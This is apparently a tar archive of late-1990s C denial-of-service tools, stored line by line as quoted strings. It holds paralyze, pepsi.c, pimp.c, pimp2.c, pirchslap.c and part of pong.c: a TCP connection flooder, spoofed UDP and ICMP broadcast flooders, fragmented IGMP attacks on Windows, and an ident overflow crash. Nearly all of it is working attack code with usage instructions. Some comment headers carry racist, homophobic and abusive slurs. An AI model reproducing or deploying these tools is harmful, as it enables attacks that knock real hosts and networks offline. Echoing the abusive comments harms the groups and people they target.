            " * | connections remotely, it should be known that this",
            " * | program does not hide identity in any way.",
            " * |",
            " * | If you rip any of this code give me credit for it.",
            " * |",
            " * +-----> ' 9 6 - 0 0  C y b e r - S t r i k e  j u a r 3 z",
            " * edited by spender...had bug with the -t option...just skipped the attacks",
            " * completely...fixed the bug..(and i don't even know c well=P)  there's a few",
            " * other bugs in the code...but don't really keep the thing from working right,",
            " * so i'm not gonna fix em=P",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <signal.h>",
            "#define MAX_DESC 250       // irrelevant when using the close option",
            "#define TIMEOUT 7          // seconds",
            "                           /* 1 = yes, 0 = no */",
            "#define CLOSE 1",
            "#define FORK 1",
            "void err_hndlr(char *type);",
            "void timeout(int sig);",
            "void err_hndlr(char *type)",
            "    if(FORK == 1) kill(getpid() +1, 9);",
            "    printf(\"\\nError (%s): \", type);",
            "    fflush(stdout);",
            "    perror(\"\");",
            "    exit(-1);",
            "void timeout(int sig)",
            "    if(FORK == 1) kill(getpid() +1, 9);",
            "    puts(\"\\nError (connect): Attempt to connect timed out\");",
            "    exit(-1);",
            "int main(int argc, char *argv[])",
            "    int sockdesc, conns, port, opt;",
            "    int wait = 0, times = 0;",
            "    char *host;",
            "    struct hostent *buf;",
            "    struct sockaddr_in sin;",
            "    puts(\"paralyze v3 - leet daemon-disabling artillery, by xhostile\");",
            "    puts(\"----------------------------------------------------------\");",
            "    if(argc < 3 || argc > 7) {",
            "        printf(\"Usage: %s <host> <port> [-w wait] [-t times]\\n\", argv[0]);",
            "        exit(-1);",
            "    }",
            "    if((buf = gethostbyname(argv[1])) == NULL) {",
            "        fprintf(stderr, \"Error (resolve): %s is not a valid host\\n\", argv[1]);",
            "        exit(-1);",
            "    }",
            "    host = argv[1];",
            "    port = atoi(argv[2]);",
            "    conns = 0;",
            "    while((opt = getopt(argc, argv, \"w:t:\")) != -1) {",
            "        switch(opt) {",
            "              case 'w':",
            "                 wait = atoi(optarg);",
            "                 break;",
            "              case 't':",
            "                 times = atoi(optarg);",
            "                 break;",
            "              case '?':",
            "                 exit(-1);",
            "        }",
            "    }",
            "    printf(\"Host....... %s\\n\", host);",
            "    printf(\"Port....... %d\\n\", port);",
            "    if(wait != 0)",
            "        printf(\"Interval... %d\\n\", wait);",
            "    else",
            "        puts(\"Interval... fast as possible\");",
            "    if(times != 0)",
            "        printf(\"Times...... %d\\n\", times);",
            "    else",
            "        puts(\"Times...... infinite\");",
            "    memcpy((caddr_t)&sin.sin_addr.s_addr, buf->h_addr, buf->h_length);",
            "    sin.sin_family  = AF_INET;",
            "    sin.sin_port = htons(port);",
            "    printf(\"\\nMaking connections (. = 15)\");",
            "    fflush(stdout);",
            "    if(FORK == 1)",
            "        if(fork() < 0) err_hndlr(\"fork\");",
            "    while(times == 0 || conns < times) {",
            "        if((sockdesc = socket(AF_INET, SOCK_STREAM, 0)) < 0) err_hndlr(\"socket\");",
            "        signal(SIGALRM, timeout);",
            "        alarm(TIMEOUT);",
            "        if(CLOSE == 0 && MAX_DESC == conns) {",
            "            if(FORK == 1) kill(getpid() +1, 9);",
            "            printf(\"\\nDescriptor limit (%d) reached\\n\", MAX_DESC);",
            "            exit(0);",
            "        }",
            "        if(connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) < 0) err_hndlr(\"connect\");",
            "        if(CLOSE == 1) close(sockdesc);",
            "        conns++;",
            "        if(!((conns)%15)) printf(\".\");",
            "        fflush(stdout);",
            "    }",
            "    if(FORK == 1) kill(getpid() +1, 9);",
            "    printf(\"\\nDone (%d connects)\\n\", times);",
            "    exit(0);",
            "/*                    www.hack.co.za                    */",
            "datapool/src/pepsi.c",
            "0100644",
            "0000000",
            "0000000",
            "00000015335",
            "07100657312",
            "013443",
            "ustar  ",
            "root",
            "root",
            " * pepsi.c ",
            " * Random Source Host UDP flooder",
            " * Author: Soldier@data-t.org",
            " * [12.25.1996] ",
            " * Greets To: Havok, nightmar, vira, Kage, ananda, tmw, Cheesebal, efudd,",
            " * Capone, cph|ber, WebbeR, Shadowimg, robocod, napster, marl, eLLjAY, fLICK^",
            " * Toasty, [shadow], [magnus] and silitek, oh and Data-T.",
            " * Fuck You to: Razor1911 the bigest fucking lamers in the warez comunity,",
            " * Yakuza for ripping my code,  #cha0s on the undernet for trying to port",
            " * it to win95, then ircOpers on efnet for being such cocksuckers ",
            " * especially prae for trying to call the fbi on me at least 5 times.",
            " * all warez pups i don't know for ripping off honest programers. ",
            " * and Dianora for being a lesbian hoe, Srfag..err SrfRog for having an ego ",
            " * the size of california.  ",
            " * AND A BIG HUGE ENORMOUS FUCK YOU TO myc, throwback, crush, asmodean, Piker,",
            " * pireaus, A HUGE FUCKING FUCK to texas.net, and the last HUGEST FUCK IN",
            " * INTERNET HISTORY, AMM.",
            " * Disclaimer since i don't wanna go to jail",
            " *   - this is for educational purposes only",
            "/* [Defines] */",
            "#define FRIEND \"My christmas present to the internet -Soldier\"",
            "#define VERSION \"Pepsi.c v1.6\"",
            "#define DSTPORT 7",
            "#define SRCPORT 19",
            "#define PSIZE 1024",
            "#define DWAIT 1",
            "/* [Includes] */",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <stdio.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#include <signal.h>",
            "#include <netinet/udp.h>",
            "#include <string.h>",
            "#include <pwd.h>",
            "/* [Banner] */",
            "void banner()",
            "    printf(\"\\t\\t\\t%s Author - Soldier  \\n\", VERSION);",
            "    printf(\"\\t\\t\\t         [10.27.96]    \\n\\n\");",
            "    printf(\"This Copy Registered to: %s\\n\\n\", FRIEND);",
            "/* [Option Parsing] */",
            "struct sockaddr_in dstaddr;",
            "unsigned long dst;",
            "struct udphdr *udp;",
            "struct iphdr *ip;",
            "char *target;",
            "char *srchost;",
            "int dstport = 0;",
            "int srcport = 0;",
            "int numpacks = 0;",
            "int psize = 0;",
            "int wait = 0;",
            "/* [Usage] */",
            "void usage(char *pname)",
            "    printf(\"usage:\\n  \");",
            "    printf(\"%s [-s src] [-n num] [-p size] [-d port] [-o port] [-w wait] <dest>\\n\\n\", pname);",
            "    printf(\"\\t-s <src>    : source where packets are comming from\\n\");",
            "    printf(\"\\t-n <num>    : number of UDP packets to send\\n\");",
            "    printf(\"\\t-p <size>   : Packet Size               [Default is 1024]\\n\");",
            "    printf(\"\\t-d <port>   : Destination Port          [Default is  %.2d]\\n\", DSTPORT);",
            "    printf(\"\\t-o <port>   : Source Port               [Default is  %.2d]\\n\", SRCPORT);",
            "    printf(\"\\t-w <time>   : Wait time between packets [Default is    1]\\n\");",
            "    printf(\"\\t<dest>      : destination \\n\");",
            "    printf(\"\\n\");",
            "    exit(EXIT_SUCCESS);",
            "/* [In chksum with some mods] */",
            "unsigned short in_cksum(addr, len)",
            "u_short *addr;",
            "int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while (nleft > 1) {",
            "\tsum += *w++;",
            "\tsum += *w++;",
            "\tnleft -= 2;",
            "    }",
            "    if (nleft == 1) {",
            "\t*(u_char *) (&answer) = *(u_char *) w;",
            "\tsum += answer;",
            "    }",
            "    sum = (sum >> 17) + (sum & 0xffff);",
            "    sum += (sum >> 17);",
            "    answer = -sum;",
            "    return (answer);",
            "/* Resolve Functions */",
            "unsigned long resolve(char *cp)",
            "    struct hostent *hp;",
            "    hp = gethostbyname(cp);",
            "    if (!hp) {",
            "\tprintf(\"[*] Unable to resolve %s\\t\\n\", cp);",
            "        exit(EXIT_FAILURE);",
            "    }",
            "    return ((unsigned long) hp->h_addr);",
            "void resolvedest(void)",
            "    struct hostent *host;",
            "    memset(&dstaddr, 0, sizeof(struct sockaddr_in));",
            "    dstaddr.sin_family = AF_INET;",
            "    dstaddr.sin_addr.s_addr = inet_addr(target);",
            "    if (dstaddr.sin_addr.s_addr == -1) {",
            "\thost = gethostbyname(target);",
            "\tif (host == NULL) {",
            "\t    printf(\"[*] Unable To resolve %s\\t\\n\", target);",
            "            exit(EXIT_FAILURE);",
            "\tdstaddr.sin_family = host->h_addrtype;",
            "\tmemcpy((caddr_t) & dstaddr.sin_addr, host->h_addr, host->h_length);",
            "    }",
            "    memcpy(&dst, (char *) &dstaddr.sin_addr.s_addr, 4);",
            "/* Parsing Argz */",
            "void parse_args(int argc, char *argv[])",
            "    int opt;",
            "    while ((opt = getopt(argc, argv, \"s:d:n:p:w:o:\")) != -1)",
            "\tswitch (opt) {",
            "\tcase 's':",
            "\t    srchost = (char *) malloc(strlen(optarg) + 1);",
            "\t    strcpy(srchost, optarg);",
            "\t    break;",
            "\tcase 'd':",
            "\t    dstport = atoi(optarg);",
            "\t    break;",
            "\tcase 'n':",
            "\t    numpacks = atoi(optarg);",
            "\t    break;",
            "\tcase 'p':",
            "\t    psize = atoi(optarg);",
            "\t    break;",
            "\tcase 'w':",
            "\t    wait = atoi(optarg);",
            "\t    break;",
            "\tcase 'o':",
            "\t    srcport = atoi(optarg);",
            "\t    break;",
            "\tdefault:",
            "\t    usage(argv[0]);",
            "    if (!dstport)",
            "\tdstport = DSTPORT;",
            "    if (!srcport)",
            "\tsrcport = SRCPORT;",
            "    if (!psize)",
            "\tpsize = PSIZE;",
            "    if (!wait)",
            "\twait = DWAIT;",
            "    if (!argv[optind]) {",
            "\tputs(\"[*] Specify a target host, doof!\");",
            "\texit(EXIT_FAILURE);",
            "    }",
            "    target = (char *) malloc(strlen(argv[optind]));",
            "    if (!target) {",
            "\tputs(\"[*] Agh!  Out of memory!\");",
            "        perror(\"malloc\");",
            "\texit(EXIT_FAILURE);",
            "    }",
            "    strcpy(target, argv[optind]);",
            "/* [Send Packet] */",
            "void main(int argc, char *argv[])",
            "    int sen, i, unlim = 0, sec_check;",
            "    char *packet;",
            "    banner();",
            "    if (argc < 2)",
            "\tusage(argv[0]);",
            "    parse_args(argc, argv);",
            "    resolvedest();",
            "    printf(\"# Target Host          : %s\\n\", target);",
            "    printf(\"# Source Host          : %s\\n\",",
            "\t   (srchost && *srchost) ? srchost : \"Random\");",
            "    if (!numpacks)",
            "\tprintf(\"# Number               : Unliminted\\n\");",
            "    else",
            "\tprintf(\"# Number               : %d\\n\", numpacks);",
            "    printf(\"# Packet Size          : %d\\n\", psize);",
            "    printf(\"# Wait Time            : %d\\n\", wait);",
            "    printf(\"# Dest Port            : %d\\n\", dstport);",
            "    printf(\"# Source Port          : %d\\n\", srcport);",
            "    sen = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "    packet = (char *) malloc(sizeof(struct iphdr) +",
            "\t\t\t     sizeof(struct udphdr) +",
            "\t\t\t     psize);",
            "    ip = (struct iphdr *) packet;",
            "    udp = (struct udphdr *) (packet + sizeof(struct iphdr));",
            "    memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr) + psize);",
            "    if (!numpacks) {",
            "\tunlim++;",
            "\tnumpacks++;",
            "    }",
            "    if (srchost && *srchost)",
            "\tip->saddr = resolve(srchost);",
            "    ip->daddr = dst;",
            "    ip->version = 4;",
            "    ip->ihl = 5;",
            "    ip->ttl = 255;",
            "    ip->protocol = IPPROTO_UDP;",
            "    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + psize);",
            "    ip->check = in_cksum(ip, sizeof(struct iphdr));",
            "    udp->source = htons(srcport);",
            "    udp->dest = htons(dstport);",
            "    udp->len = htons(sizeof(struct udphdr) + psize);",
            "    for (i = 0; i < numpacks; (unlim) ? i++, i-- : i++) {",
            "\tif (!srchost)",
            "\t    ip->saddr = rand();",
            "\tif (sendto(sen, packet, sizeof(struct iphdr) +",
            "\t\t   sizeof(struct udphdr) + psize,",
            "\t\t   0, (struct sockaddr *) &dstaddr,",
            "\t\t   sizeof(struct sockaddr_in)) == (-1)) {",
            "\t    puts(\"[*] Error sending Packet\");",
            "\t    perror(\"SendPacket\");",
            "\t    exit(EXIT_FAILURE);",
            "    }",
            "datapool/src/pimp2.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007276",
            "07055633547",
            "013374",
            "ustar  ",
            "root",
            "root",
            "** pimp.c 6/4/99 by Rob Mosher: nyt@deadpig.org",
            "** exploits bug in m$'s ip stack",
            "** rewrite by nyt@EFnet",
            "** bug found by klepto",
            "** usage: pimp <host>",
            "** CRY what messy fucking code.",
            "** now for the gay modification :p",
            "** ** ** ** ** ** ** ** ** ** **/",
            " ** [gH] pimp2.c by icesk. [gH]",
            " ** Modified for use with toast by Gridmark",
            " ** ",
            " ** well so much for readble code.",
            " ** 1. cleaned up the code (prolly took me the longest heh)",
            " ** 2. add'd src_addr suport.",
            " ** 3. allows suport of differant igmp2 codes.",
            " ** 4. interval into wich to send packets (microseconds)",
            " **/",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <time.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <sys/socket.h>",
            "struct igmp",
            "        unsigned char igmp_type;",
            "        unsigned char igmp_code;",
            "        unsigned short igmp_cksum;",
            "        struct in_addr igmp_group;",
            "#define ERROR(a) {printf(\"%s\\n\", a);exit(-1);}",
            "u_long  resolve(char *);",
            "int main(int argc, char *argv[])",
            " int nsock, ctr, flud;",
            " char *pkt, *data;",
            " struct ip *nip;",
            " struct igmp *nigmp;",
            " struct sockaddr_in s_addr_in;",
            " flud = 0;",
            " setvbuf(stdout, NULL, _IONBF, 0);",
            " if(argc != 6) ERROR(\"pimp2.c by icesk.\\n<dest_addr> <num> <src_addr> <igmp code; pimp: 31> <interval>\");",
            " if(atoi(argv[2]) == 0) { flud = 1; }",
            " nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            " pkt = malloc(1500);",
            " memset(&s_addr_in, 0, sizeof(s_addr_in));",
            " memset(pkt, 0, 1500);",
            " nip = (struct ip *) pkt;",
            " nigmp = (struct igmp *) (pkt + sizeof(struct ip));",
            " data = (char *)(pkt + sizeof(struct ip) + sizeof(struct igmp));",
            " memset(data, 'A', 1500-(sizeof(struct ip) + sizeof(struct igmp)));",
            " s_addr_in.sin_addr.s_addr = resolve(argv[1]);",
            " nip->ip_v  = 4;",
            " nip->ip_hl  = 5;",
            " nip->ip_tos  = 0;",
            " nip->ip_id  = 69;",
            " nip->ip_ttl  = 255;",
            " nip->ip_p  = IPPROTO_IGMP;",
            " nip->ip_sum  = 0;",
            " nip->ip_dst.s_addr = s_addr_in.sin_addr.s_addr;",
            " nip->ip_src.s_addr = resolve(argv[3]);",
            " nigmp->igmp_type = 2;",
            " nigmp->igmp_code = atoi(argv[4]);",
            " nigmp->igmp_cksum = 0;",
            " inet_aton(\"128.1.1.1\", &nigmp->igmp_group);",
            " for(ctr = 0;ctr < atoi(argv[2]);ctr++) {",
            "   printf(\"...\\r\");",
            "   nip->ip_len  = 1500;",
            "   nip->ip_off  = htons(IP_MF);",
            "   sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "   nip->ip_off  = htons(1480/8)|htons(IP_MF);",
            "   sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "   nip->ip_off  = htons(5920/8)|htons(IP_MF);",
            "   sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "   nip->ip_len   = 831;",
            "   nip->ip_off  = htons(7400/8);",
            "   sendto(nsock, pkt, 831, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "/* {",
            "  printf(\"packets sent\\nentering flood mode to finish it off [crtl+c to finish]\\n\");",
            "  while(1){",
            "    nip->ip_len  = 1500;",
            "    nip->ip_off  = htons(IP_MF);",
            "    sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "    usleep(atoi(argv[5]));",
            "    nip->ip_off  = htons(1480/8)|htons(IP_MF);",
            "    sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "    usleep(atoi(argv[5]));",
            "    nip->ip_off  = htons(5920/8)|htons(IP_MF);",
            "    sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "    usleep(atoi(argv[5]));",
            "    nip->ip_len   = 831;",
            "    nip->ip_off  = htons(7400/8);",
            "    sendto(nsock, pkt, 831, 0, (struct sockaddr *) &s_addr_in,sizeof(s_addr_in));",
            "    usleep(atoi(argv[5]));",
            "  } */",
            "  shutdown(nsock, 2);",
            "u_long resolve(char *host)",
            "        struct hostent *he;",
            "        u_long ret;",
            "        if(!(he = gethostbyname(host)))",
            "        {",
            "                herror(\"gethostbyname()\");",
            "                exit(-1);",
            "        }",
            "        memcpy(&ret, he->h_addr, sizeof(he->h_addr));",
            "        return ret;",
            "/*EOF*/",
            "datapool/src/pimp.c",
            "0100644",
            "0000000",
            "0000000",
            "00000005303",
            "07100655720",
            "013263",
            "ustar  ",
            "root",
            "root",
            "** pimp.c 6/4/99 by Rob Mosher: nyt@deadpig.org",
            "** exploits bug in m$'s ip stack",
            "** rewrite by nyt@EFnet",
            "** bug found by klepto",
            "** usage: pimp <host> <number>",
            "** edited by spender...added number of attacks",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <time.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <sys/socket.h>",
            "struct igmp",
            "        unsigned char igmp_type;",
            "        unsigned char igmp_code;",
            "        unsigned short igmp_cksum;",
            "        struct in_addr igmp_group;",
            "#define ERROR(a) {printf(\"ERROR: %s\\n\", a);exit(-1);}",
            "u_long  resolve(char *);",
            "int main(int argc, char *argv[])",
            " int nsock, ctr;",
            " char *pkt, *data;",
            " struct ip *nip;",
            " struct igmp *nigmp;",
            " struct sockaddr_in s_addr_in;",
            " setvbuf(stdout, NULL, _IONBF, 0);",
            " printf(\"pimp.c by nyt\\n\");",
            " if(argc != 3)",
            "  ERROR(\"usage: pimp <host> <number>\");",
            " if((nsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)",
            "  ERROR(\"could not create raw socket\");",
            " pkt = malloc(1500);",
            " if(!pkt)",
            "  ERROR(\"could not allocate memory\");",
            " memset(&s_addr_in, 0, sizeof(s_addr_in));",
            " memset(pkt, 0, 1500);",
            " nip = (struct ip *) pkt;",
            " nigmp = (struct igmp *) (pkt + sizeof(struct ip));",
            " data = (char *)(pkt + sizeof(struct ip) + sizeof(struct igmp));",
            " memset(data, 'A', 1500-(sizeof(struct ip) + sizeof(struct igmp)));",
            " s_addr_in.sin_addr.s_addr = resolve(argv[1]);",
            " nip->ip_v  = 4;",
            " nip->ip_hl  = 5;",
            " nip->ip_tos  = 0;",
            " nip->ip_id  = 69;",
            " nip->ip_ttl  = 255;",
            " nip->ip_p  = IPPROTO_IGMP;",
            " nip->ip_sum  = 0;",
            " nip->ip_dst.s_addr = s_addr_in.sin_addr.s_addr;",
            " nip->ip_src.s_addr = 2147100000;",
            " nigmp->igmp_type = 2;",
            " nigmp->igmp_code = 31;",
            " nigmp->igmp_cksum = 0;",
            " inet_aton(\"128.1.1.1\", &nigmp->igmp_group);",
            " printf(\"pimpin' dem trick-ass-bitches\");",
            " for(ctr = 0;ctr < atoi(argv[2]);ctr++)",
            "  printf(\".\");",
            "  nip->ip_len  = 1500;",
            "  nip->ip_off  = htons(IP_MF);",
            "  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,",
            "sizeof(s_addr_in));",
            "  nip->ip_off  = htons(1480/8)|htons(IP_MF);",
            "  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,",
            "sizeof(s_addr_in));",
            "  nip->ip_off  = htons(5920/8)|htons(IP_MF);",
            "  sendto(nsock, pkt, 1500, 0, (struct sockaddr *) &s_addr_in,",
            "sizeof(s_addr_in));",
            "  nip->ip_len   = 831;",
            "  nip->ip_off  = htons(7400/8);",
            "  sendto(nsock, pkt, 831, 0, (struct sockaddr *) &s_addr_in,",
            "sizeof(s_addr_in));",
            " printf(\"*slap* *slap* bitch, who yo daddy\\n\");",
            " shutdown(nsock, 2);",
            " close(nsock);",
            "u_long resolve(char *host)",
            "        struct hostent *he;",
            "        u_long ret;",
            "        if(!(he = gethostbyname(host)))",
            "        {",
            "                herror(\"gethostbyname()\");",
            "                exit(-1);",
            "        }",
            "        memcpy(&ret, he->h_addr, sizeof(he->h_addr));",
            "        return ret;",
            "datapool/src/pirchslap.c",
            "0100644",
            "0000000",
            "0000000",
            "00000004154",
            "07100655740",
            "014310",
            "ustar  ",
            "root",
            "root",
            "/* code by eth0 from buffer0verfl0w security */",
            "/* http://www.b0f.com */",
            "   *NOTE* code was not tested, this was only coded with the information",
            "          given by Chopsui-cide/MmM '00, use at your own risk",
            "   *NOTE*",
            "Pirch98 ident/fserve daemon DoS attack",
            " Feb, 20 2000 - 00:05",
            " contributed by: Chopsui-cide",
            " Pirch98 irc client can be trivially crashed by a simple overflow if",
            "either the fserve, or ident daemons are active. ",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <unistd.h>",
            "#define dport 113 ",
            "#define LEN 512",
            "int x, s;",
            "char *str;  /* varying the size would give diff results */",
            "struct sockaddr_in addr, spoofedaddr;",
            "struct hostent *host;",
            "int open_sock(int sock, char *server, int port) {",
            "     struct sockaddr_in blah;",
            "     struct hostent *he;",
            "     bzero((char *)&blah,sizeof(blah));",
            "     blah.sin_family=AF_INET;",
            "     blah.sin_addr.s_addr=inet_addr(server);",
            "     blah.sin_port=htons(port);",
            "    if ((he = gethostbyname(server)) != NULL) {",
            "        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);",
            "    }",
            "    else {",
            "         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {",
            "           perror(\"gethostbyname()\");",
            "           return(-3);",
            "         }",
            "    }",
            "        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {",
            "             perror(\"connect()\");",
            "             close(sock);",
            "             return(-4);",
            "        }",
            "        printf(\"Connected to [%s:%d].\\n\",server,port);",
            "        return;",
            "int main(int argc, char *argv[]) {",
            "     if (argc != 2) {",
            "        printf(\"Usage: %s <target>\\n\",argv[0]);",
            "\texit(0);",
            "     }",
            "     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {",
            "        perror(\"socket()\");",
            "        exit(-1);",
            "     }",
            "     open_sock(s,argv[1],dport);",
            "       printf(\"Sending crash....\\n \");",
            "       send(s,str,LEN,0);",
            "       printf(\"1st crash sent...\\n\");",
            "       printf(\"Sending crash....\\n\");",
            "       send(s,str,LEN,0);",
            "       printf(\"2nd crash sent...\\n\");",
            "       printf(\"Sending crash.... \\n\");",
            "       send(s,str,LEN,0);",
            "       printf(\"3rd crash sent...\\n\");",
            "      ",
            "     printf(\"Done!\\n\");",
            "     close(s);",
            "return(0);",
            "datapool/src/pong.c",
            "0100644",
            "0000000",
            "0000000",
            "00000016424",
            "07100655762",
            "013275",
            "ustar  ",
            "root",
            "root",
            " * pong.c - by FA-Q",
            " * spoofed icmp broadcast flooder",
            " * niggaz:     #virii, #innuendo, zakath (for echok.c (where I got 99% of this code))",
            " *             panasync (for the best irc client made).",
            " * niggers:    drow, ducktape (for leaving sexual messages on my answering machine), ",
            " *             gridnet (for killing my account when I was testing this program),",
            " *             [watchy] i want to be under niggers. ",
            " * disclaimer: this is for educational use only. please don't abuse this. also, do not",
            " *   \t       ask me how to use this.",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip_icmp.h>",
            "#define IPHDRSIZE sizeof(struct iphdr)",
            "#define ICMPHDRSIZE sizeof(struct icmphdr)",
            "#define VIRGIN \"1.1\"",
            "void version(void)   {",
            "\tprintf(\"pong %s - by FA-Q\\n\", VIRGIN);",
            "        }",
            "void usage(const char *progname)",
            "     {",
            "\tprintf(\"usage: %s [-fV] [-c count] [-i wait] [-s packetsize] <target> <broadcast>\\n\",progname);",
            "       \t}",
            "unsigned char *dest_name;",
            "unsigned char *spoof_name = NULL;",
            "struct sockaddr_in destaddr, spoofaddr;",
            "unsigned long dest_addr;",
            "unsigned long spoof_addr;",
            "unsigned      pingsize, pingsleep, pingnmbr;",
            "char          flood = 0;",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    sum = (sum >> 16) + (sum & 0xffff); ",
            "    sum += (sum >> 16);",
            "    answer = ~sum;",
            "    return(answer);",
            "int resolve( const char *name, struct sockaddr_in *addr, int port )",
            "     {",
            "\tstruct hostent *host;",
            "\tbzero((char *)addr,sizeof(struct sockaddr_in));",
            "\tif (( host = gethostbyname(name) ) == NULL )  {",
            "\t   fprintf(stderr,\"%s will not resolve\\n\",name);",
            "\t   perror(\"\"); return -1;",
            "\taddr->sin_family = host->h_addrtype;",
            "\tmemcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "\taddr->sin_port = htons(port);",
            "     ",
            "        return 0;",
            "     }",
            "unsigned long addr_to_ulong(struct sockaddr_in *addr)",
            "     {",
            "\treturn addr->sin_addr.s_addr;",
            "     }",
            "int resolve_one(const char *name, unsigned long *addr, const char *desc)",
            "     {",
            "        struct sockaddr_in tempaddr;",
            "\tif (resolve(name, &tempaddr,0) == -1) {",
            "\t   printf(\"%s will not resolve\\n\",desc);",
            "\t   return -1;",
            "            ",
            "\t*addr = tempaddr.sin_addr.s_addr;",
            "       \treturn 0;",
            "     }",
            "int resolve_all(const char *dest,",
            "\t\tconst char *spoof)",
            "     {",
            "        if (resolve_one(dest,&dest_addr,\"dest address\")) return -1;",
            "\tif (spoof!=NULL) ",
            "\t  if (resolve_one(spoof,&spoof_addr,\"spoof address\")) return -1;",
            "\tspoofaddr.sin_addr.s_addr = spoof_addr;",
            "        spoofaddr.sin_family = AF_INET;",
            "\tdestaddr.sin_addr.s_addr = dest_addr;",
            "\tdestaddr.sin_family      = AF_INET;",
            "     }",
            "void give_info(void)",
            "     {",
            "       printf(\"\\nattacking (%s) from (%s)\\n\",inet_ntoa(spoof_addr),dest_name);",
            "     }",
            "int parse_args(int argc, char *argv[]) ",
            "     {",
            "        int opt;",
            "\tchar *endptr;",
            "\twhile ((opt=getopt(argc, argv, \"fc:s:i:V\")) != -1)  {",
            "\t   switch(opt)  {",
            "\t      case 'f': flood = 1; break;",
            "\t      case 'c': pingnmbr = strtoul(optarg,&endptr,10);",
            "\t                if (*endptr != '\\0')  {",
            "\t\t           printf(\"%s is an invalid number '%s'.\\n\", argv[0], optarg);",
            "\t\t\t   return -1;",
            "\t           \t}",
            "\t\t        break;",
            "\t      case 's': pingsize = strtoul(optarg,&endptr,10);",
            "\t                if (*endptr != '\\0')  {",
            "\t\t           printf(\"%s is a bad packet size '%s'\\n\", argv[0], optarg);",
            "\t\t           return -1;",
            "\t           \t}",
            "\t\t        break;",
            "\t      case 'i': pingsleep = strtoul(optarg,&endptr,10);",
            "\t                if (*endptr != '\\0')  {",
            "\t\t           printf(\"%s is a bad wait time '%s'\\n\", argv[0], optarg);",
            "\t\t           return -1;",
            "\t           \t}",
            "\t\t        break;",
            "\t      case 'V': version(); break;",
            "\t      case '?':",
            "\t      case ':': return -1; break;",
            "\t   }",
            "\t    ",
            "\tif (optind > argc-2)  {",
            "\t   return -1;",
            "        ",
            "        if (!pingsize)",
            "          pingsize = 28;",
            "        else",
            "          pingsize = pingsize - 36 ;",
            "        if (!pingsleep)",
            "          pingsleep = 100;",
            "\tspoof_name = argv[optind++];",
            "\tdest_name = argv[optind++];",
            "    \treturn 0; \t\t      \t",
            "     }",
            " inline int icmp_echo_send(int                socket, ",
            " \t\t\t   unsigned long      spoof_addr,",
            "\t\t\t   unsigned long      t_addr,",
            "\t\t\t   unsigned           pingsize)",
            "     {",
            "\tunsigned char packet[5122];",
            "\tstruct iphdr   *ip;",
            "\tstruct icmphdr *icmp;",
            "\tstruct iphdr   *origip;",
            "        unsigned char  *data;",
            "        int i;",
            "\tip = (struct iphdr *)packet;",
            "\ticmp = (struct icmphdr *)(packet+IPHDRSIZE);",
            "\torigip = (struct iphdr *)(packet+IPHDRSIZE+ICMPHDRSIZE);",
            "\tdata = (char *)(packet+pingsize+IPHDRSIZE+IPHDRSIZE+ICMPHDRSIZE);",
            "\tmemset(packet, 0, 5122);",
            "\tip->version  = 4;",
            "\tip->ihl      = 5; ",
            "\tip->ttl      = 255-random()%15;",
            "\tip->protocol = IPPROTO_ICMP;",
